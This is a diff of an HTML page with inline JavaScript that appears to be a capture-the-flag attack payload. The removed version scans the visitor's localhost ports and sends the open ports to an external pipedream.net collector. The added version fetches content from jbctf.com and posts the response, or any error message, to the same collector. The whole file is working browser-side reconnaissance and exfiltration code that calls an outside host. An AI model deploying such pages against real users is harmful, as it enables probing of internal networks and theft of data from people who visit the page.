@@ -1,47 +1,50 @@
 <html>
 <script>
-const startPort = 80;
-const endPort = 443;
-const openPorts = [];
-
-function checkPort(port) {
-  return fetch(`http://localhost:${port}`)
-    .then(response => {
-      if (response.ok) {
-        openPorts.push(port);
-      }
-    })
-    .catch(error => {
-      if (!error.toString().includes("Failed to fetch")) {
-        openPorts.push(port);
-      }
-    });
-}
-
-async function checkOpenPorts() {
-  for (let port = startPort; port <= endPort; port++) {
-    await checkPort(port);
-  }
-  
-  // Pass the open ports as X-Open-Ports header to a server
-  const url = 'https://en72zi74mfxbc.x.pipedream.net'; // Replace with your desired server URL
-
-  fetch(url, {
-    method: 'GET',
-    headers: {
-      'X-Open-Ports': openPorts.join(', ')
+fetch("https://jbctf.com")
+  .then(response => {
+    if (!response.ok) {
+      throw new Error("Request failed: " + response.status);
     }
+    return response.text();
   })
-    .then(response => {
-      // Handle the response if needed
-      console.log(response);
+  .then(data => {
+    fetch("https://en72zi74mfxbc.x.pipedream.net", {
+      method: "POST",
+      headers: {
+        "Content-Type": "text/plain"
+      },
+      body: data
     })
-    .catch(error => {
-      // Handle error
-      console.error('Error sending open ports:', error);
-    });
-}
-
-checkOpenPorts();
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Request failed: " + response.status);
+        }
+        return response.text();
+      })
+      .then(responseData => {
+        console.log("Response data:", responseData);
+      })
+      .catch(error => {
+        console.error("Second request failed:", error);
+      });
+  })
+  .catch(error => {
+    fetch("https://en72zi74mfxbc.x.pipedream.net", {
+      method: "POST",
+      headers: {
+        "Content-Type": "text/plain"
+      },
+      body: error.message
+    })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Request failed: " + response.status);
+        }
+        return response.text();
+      })
+      .catch(error => {
+        console.error("Error sending error to server:", error);
+      });
+  });
 </script>
 </html>
